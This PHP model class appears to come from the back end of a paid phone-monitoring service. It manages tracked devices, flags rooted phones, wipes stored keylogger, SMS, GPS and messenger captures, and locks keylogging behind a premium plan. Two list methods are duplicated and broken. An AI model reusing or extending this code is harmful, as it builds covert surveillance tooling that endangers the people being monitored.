<?php

namespace Models;

class Devices extends \System\Model
{

    static $networksList = array(
        'wifi' => 'Wi-Fi only',
        'any' => 'Wi-Fi and Mobile Network'
    );
    static $networkFeatures = array(
        'photos' => 'photos_network',
        'videos' => 'video_network'
    );

    public function getDevicesByUser($id)
    {
        $id = (int) $id;

        $minOnlineTime = time() - 20 * 60;

        return $this->getDb()->query("SELECT 
                                        ud.`dev_id`,
                                        ud.`ident`,
                                        ud.`os`,
                                        ud.`os_version`,
                                        ud.`app_version`,
                                        ud.`dev_model` model,
                                        IF(ds.`last_visit` > {$minOnlineTime}, 1, 0) online,
                                        l.`plan`,
                                        ds.`rooted`
                                FROM `g1_users` u
                                INNER JOIN `user_dev` ud ON u.`user_login` = ud.`email`
                                INNER JOIN `dev_settings` ds ON ud.`dev_id` = ds.`dev_id`
                                INNER JOIN `limitations` l ON ud.`dev_id` = l.`dev_id`
                                WHERE u.`id` = {$id}")->fetchAll(\PDO::FETCH_ASSOC | \PDO::FETCH_UNIQUE);
    }
    
    public function getDevicesList($userId) {
        $escapedUserId = $this->getDb()->quote($userId);
        
        return $this->getDb()->quote("SELECT
                                            `id`,
                                            `name` 
                                        FROM `devices` 
                                        WHERE
                                            `user_id` = {$escapedUserId} AND
                                            `deleted` = 0
                                        LIMIT 1")->fetch(\PDO::FETCH_KEY_PAIR);
    }
    
    public function getUnAssignedDevicesList($userId) {
        $escapedUserId = $this->getDb()->quote($userId);
        
        return $this->getDb()->quote("SELECT
                                            `id`,
                                            `name` 
                                        FROM `devices` 
                                        WHERE
                                            `user_id` = {$escapedUserId} AND
                                            `deleted` = 0
                                        LIMIT 1")->fetch(\PDO::FETCH_KEY_PAIR);
    }

    public function setNetwork($devId, $feature, $net)
    {
        if (!isset(self::$networkFeatures[$feature])) {
            throw new \Exception('Invalid feature');
        }

        if ($net !== 'any' && $net !== 'wifi') {
            throw new DevicesInvalidNetworkException();
        }

        $column = self::$networkFeatures[$feature];
        $devId = $this->getDB()->quote($devId);
        $net = $this->getDB()->quote($net);

        $this->getDb()->exec("UPDATE `dev_settings` SET `{$column}` = {$net} WHERE `dev_id` = {$devId}");
    }

    public function getNetwork($devId, $feature)
    {
        if (!isset(self::$networkFeatures[$feature])) {
            throw new \Exception('Invalid feature');
        }

        $column = self::$networkFeatures[$feature];
        $devId = $this->getDB()->quote($devId);

        return $this->getDb()->query("SELECT `{$column}` FROM `dev_settings` WHERE `dev_id` = {$devId} LIMIT 1")->fetchColumn();
    }

    public function getSettings($devId)
    {
        $devId = $this->getDB()->quote($devId);

        return $this->getDb()->query("SELECT * FROM `dev_settings` WHERE `dev_id` = {$devId} LIMIT 1")->fetch();
    }

    public function getDeviceInfo($devId)
    {
        $devId = $this->getDB()->quote($devId);

        return $this->getDb()->query("SELECT `ident` name, `os`, `os_version`, `dev_model`, `app_version`, `timediff` FROM `user_dev` WHERE `dev_id` = {$devId} LIMIT 1")->fetch();
    }

    public function getPlan($devId)
    {
        $devId = $this->getDB()->quote($devId);

        return $this->getDb()->query("SELECT `plan` FROM `limitations` WHERE `dev_id` = {$devId}")->fetchColumn();
    }

    public function delete($devId)
    {
        $devId = $this->getDB()->quote($devId);

        return $this->getDb()->exec("UPDATE `user_dev` SET `email` = 'deleted' WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("UPDATE `user_pack` SET `assigned_dev_id` = NULL WHERE `assigned_dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `limitations` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `applications` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `browser_bookmarks` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `browser_history` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `browser_blocked` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `calendar_events` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `call_log` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `contacts` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `cydia_apps` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `dev_settings` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `facebook_messages` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `gps_log` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `skype_calls` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `skype_messages` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `sms_log` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `user_dev` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `viber_calls` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `viber_messages` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `video` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `whatsapp_messages` WHERE `dev_id` = {$devId}") |
                $this->getDb()->exec("DELETE FROM `keylogger` WHERE `dev_id` = {$devId}");
    }

    public function deleteFiles($devId)
    {
        $s3 = $this->di->get('S3');
        return $s3->deleteObject($this->di['config']['s3']['bucket'], $devId . '/');
    }

    public function getCurrentDevId()
    {
        if (!isset($_SESSION['devId']) || !isset($this->di['devicesList'][$_SESSION['devId']])) {
            if (count($this->di['devicesList'])) {
                $devices = array_keys($this->di['devicesList']);
                $devId = $devices[0];
            } else {
                $devId = null;
            }
            $this->setCurrentDevId($devId);
        } else {
            $devId = $_SESSION['devId'];
        }

        return $devId;
    }

    public function setCurrentDevId($devId)
    {
        $_SESSION['devId'] = $devId;
    }

    public function getDevicesSelectList()
    {
        $result = array();
        foreach ($this->di['devicesList'] as $key => $value) {
            $result[$key] = $value['ident'];
        }

        return $result;
    }

    public function isModuleActive($data)
    {
        if (is_string($data)) {
            return $data;
        }

        if (isset($data['show']) && is_callable($data['show']) && $data['show']($this->di)) {
            return $data['name'];
        }
        
        return false;
    }

    //@todo update for billing
    public function isPaid($module)
    {
        switch ($module) {
            case 'keylogger':
                return $this->di['currentDevice']['plan'] == 'PRO Plus';

            case 'photos':
                return ($this->di['currentDevice']['plan'] == 'PRO Plus') || ($this->di['currentDevice']['plan'] == 'PRO');

            case 'videos':
                return $this->di['currentDevice']['plan'] == 'PRO Plus';

            case 'viber':
                return $this->di['currentDevice']['plan'] == 'PRO Plus';

            case 'whatsapp':
                return $this->di['currentDevice']['plan'] == 'PRO Plus';

            case 'skype':
                return $this->di['currentDevice']['plan'] == 'PRO Plus';

            case 'facebook':
                return $this->di['currentDevice']['plan'] == 'PRO Plus';

            case 'vk':
                return $this->di['currentDevice']['plan'] == 'PRO Plus';

            case 'emails':
                return ($this->di['currentDevice']['plan'] == 'PRO Plus') || ($this->di['currentDevice']['plan'] == 'PRO');
        }

        return true;
    }

    //@todo update for biling
    public function buildUpdateUrl($devId, $plan, $email)
    {
        if ($plan == 'PRO') {
            return $this->getBuyNowUrl($email, $devId, 4603806);
        }
        
        return $this->getBuyNowUrl($email, $devId, 4603807);
    }

    public function getBuyNowUrl($email, $devId, $contractId)
    {
        $options = array(
            'referer' => null,
            'ref' => null,
            'affkey' => null,
            'camp' => null,
            'affiliate' => null,
            'affiliate_data' => null
        );

        if (isset($_COOKIE['affiliate'], $_COOKIE['affiliate_data'])) {
            $options['affiliate'] = $_COOKIE['affiliate'];
            $options['affiliate_data'] = $_COOKIE['affiliate_data'];
        } elseif (isset($_COOKIE['ref'])) {
            $options['ref'] = $_COOKIE['ref'];

            if (isset($_COOKIE['affkey'])) {
                $options['affkey'] = $_COOKIE['affkey'];
            }

            if (isset($_COOKIE['camp'])) {
                $options['camp'] = $_COOKIE['camp'];
            }
        }

        if (isset($_COOKIE['referer'])) {
            $options['referer'] = trim($_COOKIE['referer']);
            if (!strlen($options['referer'])) {
                unset($options['referer']);
            }
        }

        return 'https://secure.avangate.com/order/checkout.php?' . http_build_query(array(
                    'PRODS' => $contractId,
                    'QTY' => '1',
                    'CART' => '1',
                    'CARD' => '2',
                    'ADDITIONAL_BF8270' => $email,
                    'ADDITIONAL_08CB85' => $devId,
                    'ADDITIONAL_E38E33' => $options['ref'],
                    'ADDITIONAL_affkey' => $options['affkey'],
                    'ADDITIONAL_campaign' => $options['camp'],
                    'ADDITIONAL_referer' => $options['referer'],
                    'ADDITIONAL_affiliate' => $options['affiliate'],
                    'ADDITIONAL_affiliate_data' => $options['affiliate_data']
        ));
    }

}

class DevicesInvalidNetworkException extends \Exception
{
    
}
